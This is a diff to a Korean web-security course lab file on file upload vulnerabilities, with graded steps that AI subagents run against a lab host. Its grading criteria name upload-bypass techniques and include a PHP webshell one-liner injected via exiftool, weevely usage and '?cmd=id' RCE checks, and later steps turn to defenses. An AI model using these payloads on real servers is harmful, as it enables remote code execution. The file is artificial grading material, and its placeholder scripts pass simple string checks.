@@ -3,8 +3,7 @@ title: 파일 업로드 취약점 실습 (AI 지원)
 version: ai
 course: web-vuln-ai
 week: 5
-description: 파일 업로드 기능의 취약점을 악용한 웹쉘 업로드와 확장자 우회 등을 실습합니다. AI SubAgent가 자동으로 명령을 실행하고
-  결과를 검증합니다.
+description: 파일 업로드 기능의 취약점을 악용한 웹쉘 업로드와 확장자 우회 등을 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -20,13 +19,27 @@ steps:
   points: 8
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 업로드 기능 식별을(를) 수행해줘
 
-    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''업로드 기능
-    식별 완료'''
+    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''업로드 기능 식별 완료'''
   answer_detail: 업로드 기능 식별은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 파일 업로드 기능 탐색 — 폼·API 에서 multipart/form-data 엔드포인트 식별
+      success_criteria:
+      - curl 또는 크롤링으로 업로드 엔드포인트 발견
+      - multipart form 또는 PUT 요청 방식 확인
+      - 대상 필드명(file, upload, attachment 등) 기록
+      acceptable_methods:
+      - curl 로 HTML fetch 후 input type=file 검색
+      - Burp Suite 사이트맵에서 multipart 엔드포인트
+      - ffuf 로 업로드 경로 brute force
+      - API 문서 swagger.json 조회
+      negative_signs:
+      - 업로드 엔드포인트 식별 없음
+      - 단순 업로드 언급만
+      - 필드명 기록 누락
   target_vm: attacker
   script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '업로드 기능 식별 완료'
   risk_level: low
@@ -38,13 +51,27 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 허용 파일 유형 확인을(를) 수행해줘
 
-    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''허용 파일 유형
-    확인 완료'''
+    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''허용 파일 유형 확인 완료'''
   answer_detail: 허용 파일 유형 확인은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 허용 파일 유형 확인 — .jpg/.pdf/.docx 등 테스트 파일 업로드로 서버 허용 확장자·MIME 파악
+      success_criteria:
+      - 최소 3가지 파일 형식 업로드 시도
+      - 각 형식별 응답 (허용/거부) 기록
+      - 클라이언트 검증과 서버 검증 구분
+      acceptable_methods:
+      - curl -F file=@test.jpg <url>
+      - python requests files={file:...}
+      - Burp Repeater 로 Content-Type 변조
+      - wfuzz 확장자 fuzzing
+      negative_signs:
+      - 단일 파일만 시도
+      - 응답 분석 없음
+      - 클라이언트 검증 우회 개념 없음
   target_vm: attacker
   script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '허용 파일 유형 확인 완료'
   risk_level: low
@@ -56,16 +83,29 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 확장자 필터 우회(이중 확장자)을(를) 수행해줘
 
-    📎 참고 (CLI): curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo ''확장자 필터
-    우회(이중 확장자) 완료'''
+    📎 참고 (CLI): curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo ''확장자 필터 우회(이중 확장자) 완료'''
   answer_detail: 확장자 필터 우회(이중 확장자)은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 이중 확장자 우회 — shell.php.jpg, shell.jpg.php 등 파일명 조작으로 확장자 필터 회피
+      success_criteria:
+      - 이중 확장자 파일 업로드 시도 (shell.php.jpg 또는 shell.jpg.php)
+      - 서버가 파일을 저장·실행하는지 결과 판정
+      - Apache/Nginx 확장자 처리 차이(AddHandler, mod_mime) 언급
+      acceptable_methods:
+      - curl -F file=@shell.php.jpg
+      - Burp Repeater 파일명 변조
+      - Null byte 삽입 shell.php%00.jpg (구형)
+      - 대소문자 혼합 .PhP
+      negative_signs:
+      - 단일 확장자만
+      - 서버 반응 분석 없음
+      - 웹서버 설정 차이 언급 없음
   target_vm: attacker
-  script: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '확장자 필터 우회(이중
-    확장자) 완료'
+  script: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '확장자 필터 우회(이중 확장자) 완료'
   risk_level: low
   bastion_prompt: 10.20.30.80 대상으로 확장자 필터 우회(이중 확장자)을(를) 수행해줘
 - order: 4
@@ -75,16 +115,29 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 Content-Type 변조 업로드을(를) 수행해줘
 
-    📎 참고 (CLI): curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo ''Content-Type
-    변조 업로드 완료'''
+    📎 참고 (CLI): curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo ''Content-Type 변조 업로드 완료'''
   answer_detail: Content-Type 변조 업로드은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: Content-Type 변조 — 악성 파일을 image/jpeg MIME 으로 전송해 MIME 검증 우회
+      success_criteria:
+      - Content-Type 헤더를 image/jpeg 등으로 조작한 업로드
+      - 실제 확장자(.php) 와 MIME 불일치 상황 구현
+      - 파일 매직 바이트 검증의 필요성 언급
+      acceptable_methods:
+      - curl -F "file=@shell.php;type=image/jpeg"
+      - Burp Repeater 로 Content-Type 수정
+      - python requests files=(name, file, type)
+      - wfuzz 로 MIME fuzzing
+      negative_signs:
+      - Content-Type 조작 없음
+      - MIME 불일치 개념 부재
+      - 매직 바이트 언급 없음
   target_vm: attacker
-  script: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'Content-Type
-    변조 업로드 완료'
+  script: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'Content-Type 변조 업로드 완료'
   risk_level: low
   bastion_prompt: 10.20.30.80 대상으로 Content-Type 변조 업로드을(를) 수행해줘
 - order: 5
@@ -94,16 +147,29 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 매직 바이트 조작 업로드을(를) 수행해줘
 
-    📎 참고 (CLI): curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo ''매직 바이트
-    조작 업로드 완료'''
+    📎 참고 (CLI): curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo ''매직 바이트 조작 업로드 완료'''
   answer_detail: 매직 바이트 조작 업로드은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 매직 바이트 조작 — JPEG/PNG/GIF 헤더(FFD8FF, 89504E47, 474946) 를 파일 시작에 추가해 매직 검증 우회
+      success_criteria:
+      - 매직 바이트 + PHP 코드 결합 파일 생성
+      - file 명령 또는 hexdump 로 매직 확인
+      - 매직 바이트 검증만으로 불충분한 이유 설명
+      acceptable_methods:
+      - <SENSITIVE:9bc6f7b72c79499e>
+      - exiftool 로 EXIF 주입
+      - python 으로 이진 파일 생성
+      - imagemagick 변환 악용
+      negative_signs:
+      - 매직 바이트 주입 없음
+      - 검증 우회 설명 없음
+      - file 로 매직 확인 누락
   target_vm: attacker
-  script: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '매직 바이트 조작 업로드
-    완료'
+  script: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '매직 바이트 조작 업로드 완료'
   risk_level: low
   bastion_prompt: 10.20.30.80 대상으로 매직 바이트 조작 업로드을(를) 수행해줘
 - order: 6
@@ -113,13 +179,27 @@ steps:
   points: 12
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 웹쉘 업로드 시도을(를) 수행해줘
 
-    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''웹쉘 업로드
-    시도 완료'''
+    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''웹쉘 업로드 시도 완료'''
   answer_detail: 웹쉘 업로드 시도은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 웹쉘 업로드 — PHP/JSP/ASP 웹쉘 파일을 다양한 확장자로 업로드 시도 후 서버 실행 여부 확인
+      success_criteria:
+      - 단순 한 줄 웹쉘 (system/passthru/shell_exec) 파일 생성
+      - 여러 확장자(.phtml, .phar, .php7) 로 업로드 시도
+      - 업로드 후 URL 로 실행 시도와 결과 판정
+      acceptable_methods:
+      - echo php webshell > shell.phtml
+      - weevely generate <password> shell.php
+      - <SENSITIVE:334cc5eb0eba15b3>
+      - JSP/ASPX 웹쉘 변종
+      negative_signs:
+      - 웹쉘 없이 단순 이미지만 업로드
+      - 실행 경로 확인 없음
+      - 확장자 변형 없음
   target_vm: attacker
   script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '웹쉘 업로드 시도 완료'
   risk_level: medium
@@ -131,16 +211,29 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 이미지 파일 내 코드 삽입을(를) 수행해줘
 
-    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''이미지 파일
-    내 코드 삽입 완료'''
+    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''이미지 파일 내 코드 삽입 완료'''
   answer_detail: 이미지 파일 내 코드 삽입은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 이미지에 코드 주입 — exiftool 로 EXIF Comment 에 PHP 코드 삽입 또는 파일 끝에 코드 append 후 .php.jpg 업로드
+      success_criteria:
+      - exiftool -Comment=php code 로 이미지 메타데이터 주입
+      - file 명령으로 정상 이미지 인식 확인
+      - PHP include 로 이미지 실행 시 코드 동작 개념 설명
+      acceptable_methods:
+      - exiftool -Comment=\"<?php system($_GET[cmd]); ?>\" img.jpg
+      - cat img.jpg code.php > hybrid.jpg.php
+      - stegosploit 프레임워크 언급
+      - PIL/Pillow 로 이미지에 주입
+      negative_signs:
+      - 메타데이터 주입 없음
+      - PHP include 연결 없음
+      - 정상 이미지 유지 확인 없음
   target_vm: attacker
-  script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '이미지 파일 내 코드 삽입
-    완료'
+  script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '이미지 파일 내 코드 삽입 완료'
   risk_level: medium
   bastion_prompt: 10.20.30.80 대상으로 이미지 파일 내 코드 삽입을(를) 수행해줘
 - order: 8
@@ -150,16 +243,29 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 ZIP 파일 업로드 취약점 테스트을(를) 수행해줘
 
-    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''ZIP 파일
-    업로드 취약점 테스트 완료'''
+    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''ZIP 파일 업로드 취약점 테스트 완료'''
   answer_detail: ZIP 파일 업로드 취약점 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: ZIP 업로드 악용 — Zip Slip(../경로 포함) 또는 Zip Bomb(압축해제 시 방대한 파일), 압축해제 시 상위 디렉터리 쓰기
+      success_criteria:
+      - Zip Slip 페이로드 생성 (파일 경로에 ../../)
+      - zipbomb 개념 언급
+      - 방어(경로 정규화, 압축 크기/파일수 제한) 제시
+      acceptable_methods:
+      - python zipfile 로 악성 zip 생성
+      - evilarc 도구
+      - mkzip --traversal
+      - ZipSlip GitHub POC
+      negative_signs:
+      - 경로 조작 페이로드 없음
+      - 압축 폭탄 개념 부재
+      - 방어책 없음
   target_vm: attacker
-  script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'ZIP 파일 업로드 취약점
-    테스트 완료'
+  script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'ZIP 파일 업로드 취약점 테스트 완료'
   risk_level: medium
   bastion_prompt: 10.20.30.80 대상으로 ZIP 파일 업로드 취약점 테스트을(를) 수행해줘
 - order: 9
@@ -169,16 +275,29 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 업로드 경로 추측을(를) 수행해줘
 
-    📎 참고 (CLI): nmap -sV -p 80,443 10.20.30.80 2>/dev/null | head -10 && echo ''업로드
-    경로 추측 완료'''
+    📎 참고 (CLI): nmap -sV -p 80,443 10.20.30.80 2>/dev/null | head -10 && echo ''업로드 경로 추측 완료'''
   answer_detail: 업로드 경로 추측은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 업로드 경로 추측 — /uploads /files /media 등 일반 경로 + 원본 파일명 조합으로 직접 URL 탐색
+      success_criteria:
+      - 일반 업로드 경로 목록 (uploads/files/media/assets) 시도
+      - 업로드 후 반환된 파일명·경로 힌트 분석
+      - 디렉터리 리스팅 또는 파일명 예측 결합
+      acceptable_methods:
+      - curl <url>/uploads/<file>
+      - gobuster dir 로 경로 탐색
+      - 업로드 응답 body/location 분석
+      - wfuzz 로 파일명 brute
+      negative_signs:
+      - 경로 추측 없음
+      - 응답 분석 없음
+      - 랜덤 파일명 이슈 언급 없음
   target_vm: attacker
-  script: nmap -sV -p 80,443 10.20.30.80 2>/dev/null | head -10 && echo '업로드 경로 추측
-    완료'
+  script: nmap -sV -p 80,443 10.20.30.80 2>/dev/null | head -10 && echo '업로드 경로 추측 완료'
   risk_level: low
   bastion_prompt: 10.20.30.80 대상으로 업로드 경로 추측을(를) 수행해줘
 - order: 10
@@ -188,16 +307,29 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 업로드된 파일 실행 확인을(를) 수행해줘
 
-    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''업로드된 파일
-    실행 확인 완료'''
+    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''업로드된 파일 실행 확인 완료'''
   answer_detail: 업로드된 파일 실행 확인은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 업로드 파일 실행 확인 — 업로드된 파일을 브라우저/curl 로 GET 해서 RCE 성공 판정
+      success_criteria:
+      - curl <url>/uploads/shell.php?cmd=id 로 명령 실행 시도
+      - 응답에 id 결과(uid=...) 포함되는지 확인
+      - 실행 실패 원인(MIME, X-Content-Type-Options, .htaccess) 해석
+      acceptable_methods:
+      - curl <url>/<uploaded>?cmd=<command>
+      - browser 직접 접속
+      - weevely terminal shell.php
+      - <SENSITIVE:b99e8884576269bd>
+      negative_signs:
+      - 실행 시도 없이 업로드만 확인
+      - 응답 해석 없음
+      - 실행 차단 원인 분석 없음
   target_vm: attacker
-  script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '업로드된 파일 실행 확인
-    완료'
+  script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '업로드된 파일 실행 확인 완료'
   risk_level: medium
   bastion_prompt: 10.20.30.80 대상으로 업로드된 파일 실행 확인을(를) 수행해줘
 - order: 11
@@ -207,13 +339,27 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 10.20.30.80 대상으로 파일 크기 제한 테스트을(를) 수행해줘
 
-    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''파일 크기 제한
-    테스트 완료'''
+    📎 참고 (CLI): curl -s http://10.20.30.80 2>/dev/null | head -5 && echo ''파일 크기 제한 테스트 완료'''
   answer_detail: 파일 크기 제한 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 파일 크기 제한 테스트 — 대용량 파일 업로드로 서버 검증·DoS 가능성 평가
+      success_criteria:
+      - 10MB 이상 파일 생성 후 업로드 시도
+      - 서버 응답(413 Payload Too Large 또는 500) 분석
+      - DoS 방어(client_max_body_size, upload_max_filesize) 언급
+      acceptable_methods:
+      - dd if=/dev/zero of=big.bin bs=1M count=100
+      - curl -F file=@big.bin
+      - python requests files 대용량 stream
+      - nginx/PHP 설정 값 확인
+      negative_signs:
+      - 소용량만 업로드
+      - 413 응답 해석 없음
+      - DoS 방어 언급 없음
   target_vm: attacker
   script: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '파일 크기 제한 테스트 완료'
   risk_level: low
@@ -231,6 +377,22 @@ steps:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 업로드 디렉터리 권한 확인 — 업로드 디렉터리에 execute 권한이 있어야 webshell 실행 — nginx location, Apache Options
+        설정 검토
+      success_criteria:
+      - 업로드 경로의 HTTP 실행 가능 여부 확인(PHP handler, Options +ExecCGI)
+      - '방어: location ~ \.php$ { deny all; } 설정 예시'
+      - 파일 퍼미션(chmod) 대신 실행 차단이 핵심 방어임 언급
+      acceptable_methods:
+      - curl <url>/uploads/test.php 로 확인
+      - nginx config dump
+      - Apache .htaccess 검사
+      - 'X-Content-Type-Options: nosniff 헤더'
+      negative_signs:
+      - 권한만 확인 (실행 가능성 무시)
+      - 설정 파일 검토 없음
+      - nosniff 언급 없음
   target_vm: attacker
   script: echo '=== 업로드 디렉터리 권한 확인 ===' && echo '조치 방안 정리 완료'
   risk_level: low
@@ -248,6 +410,21 @@ steps:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 안전한 업로드 구현 방안 — 확장자 화이트리스트 + MIME 검증 + 매직 바이트 + 저장소 분리 + 실행 차단 + 랜덤 파일명 + 안티바이러스 스캔 다층
+      success_criteria:
+      - 최소 5가지 방어 계층 언급
+      - OWASP File Upload Cheat Sheet 참조
+      - CDN/S3 등 static 전용 스토리지 분리 권장
+      acceptable_methods:
+      - 화이트리스트 + MIME + magic + size + random name
+      - ClamAV 스캔 통합
+      - AWS S3 presigned URL 분리
+      - 이미지 재인코딩 (PIL save)
+      negative_signs:
+      - 방어 2개 이하
+      - 분리 저장소 언급 없음
+      - AV 스캔 누락
   target_vm: attacker
   script: echo '=== 안전한 업로드 구현 방안 정리 ===' && echo '조치 방안 정리 완료'
   risk_level: low
@@ -265,6 +442,21 @@ steps:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: 업로드 모니터링 설정 — inotifywait 또는 auditd 로 업로드 경로 파일 생성 탐지 + SIEM 로깅
+      success_criteria:
+      - inotifywait -m -e create <dir> 명령 또는 auditctl -w <dir> -p wa
+      - 생성 이벤트를 syslog/SIEM 으로 포워딩
+      - 이상 파일(.php 등) 자동 알람 로직
+      acceptable_methods:
+      - inotifywait 실시간 감시
+      - auditd -w 감사 룰
+      - Wazuh FIM (File Integrity Monitoring)
+      - Falco 런타임 규칙
+      negative_signs:
+      - 모니터링 도구 없이 설명만
+      - SIEM 통합 없음
+      - 알람 로직 없음
   target_vm: attacker
   script: echo '=== 업로드 모니터링 설정 ===' && echo '조치 방안 정리 완료'
   risk_level: low
@@ -276,16 +468,31 @@ steps:
   points: 8
   answer: '🤖 프롬프트: 파일 업로드 취약점 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== 파일 업로드 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.30.80''
-    && echo ''=== 보고서 완료 ==='''
+    📎 참고 (CLI): echo ''=== 파일 업로드 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''=== 보고서
+    완료 ==='''
   answer_detail: 취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다.
   verify:
     type: output_contains
     expect: 보고서 완료
     field: stdout
+    semantic:
+      intent: 파일 업로드 취약점 종합 리포트 — 엔드포인트/우회 기법/웹쉘 실행/권한/방어를 /tmp/upload_report.txt
+      success_criteria:
+      - 4 섹션 이상 (탐지/Exploit/Execute/방어)
+      - 업로드 경로·PoC payload 포함
+      - 파일 저장 후 cat 확인
+      acceptable_methods:
+      - heredoc markdown
+      - echo -e 다줄
+      - json/yaml 구조
+      - python template
+      negative_signs:
+      - 섹션 2 미만
+      - PoC 없음
+      - 파일 저장 없음
   target_vm: attacker
-  script: 'echo ''=== 파일 업로드 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.30.80'' &&
-    echo ''=== 보고서 완료 ==='''
+  script: 'echo ''=== 파일 업로드 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''=== 보고서 완료
+    ==='''
   risk_level: low
   bastion_prompt: 파일 업로드 취약점 실습 종합 보고서를 작성하시오.
 - order: 99
@@ -321,6 +528,5 @@ steps:
     4) 10.20.30.80 대상으로 Content-Type 변조 업로드을(를) 수행해줘
 
     5) 10.20.30.80 대상으로 매직 바이트 조작 업로드을(를) 수행해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는 다단계 작업.
   script: ''
